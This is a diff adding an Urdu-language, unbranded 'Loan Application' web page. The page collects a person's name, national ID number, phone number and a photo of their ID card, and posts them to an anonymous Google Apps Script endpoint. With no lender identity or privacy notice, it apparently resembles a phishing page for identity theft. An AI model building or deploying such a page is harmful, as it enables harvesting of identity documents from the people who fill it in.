@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ur" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Loan Application Form</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Naskh+Arabic&display=swap');
+    body {
+      margin: 0;
+      font-family: 'Noto Naskh Arabic', serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      color: #fff;
+    }
+    .form-container {
+      background: rgba(255,255,255,0.08);
+      padding: 25px;
+      border-radius: 15px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      width: 100%;
+      max-width: 450px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+    input[type="text"],
+    input[type="tel"],
+    input[type="file"] {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: rgba(255,255,255,0.15);
+      color: #fff;
+      margin-top: 5px;
+    }
+    input::placeholder {
+      color: rgba(255,255,255,0.6);
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(90deg, #43cea2, #185a9d);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+    #status {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 0.9rem;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <h2>Loan Application</h2>
+  <form id="loanForm" enctype="multipart/form-data">
+    <label>نام:</label>
+    <input type="text" name="name" placeholder="اپنا نام درج کریں" required>
+
+    <label>شناختی کارڈ نمبر:</label>
+    <input type="text" name="cnic" placeholder="xxxxx-xxxxxxx-x" required>
+
+    <label>فون نمبر:</label>
+    <input type="tel" name="phone" placeholder="03xx-xxxxxxx" required>
+
+    <label>شناختی کارڈ کی تصویر:</label>
+    <input type="file" name="photo" accept="image/*" capture="environment" required>
+
+    <button type="submit">جمع کریں</button>
+    <div id="status"></div>
+  </form>
+</div>
+
+<script>
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbz3r3vzsHHgZ3T1bj5oSoGdMoL9JyCbtzYgUgujHIahomhKMKLlKW8YvduTJGoeP1e4tg/exec";
+
+document.getElementById("loanForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+  const statusEl = document.getElementById("status");
+  statusEl.textContent = "براہ کرم انتظار کریں...";
+
+  const formData = new FormData(this);
+
+  try {
+    const res = await fetch(WEB_APP_URL, { method: "POST", body: formData });
+    const text = await res.text();
+    if (res.ok) {
+      statusEl.textContent = text || "ڈیٹا کامیابی سے جمع ہو گیا!";
+      this.reset();
+    } else {
+      statusEl.textContent = "غلطی: " + (text || res.statusText);
+    }
+  } catch (err) {
+    statusEl.textContent = "ڈیٹا جمع کرنے میں مسئلہ آیا، براہ کرم دوبارہ کوشش کریں۔";
+    console.error(err);
+  }
+});
+</script>
+
+</body>
+</html>
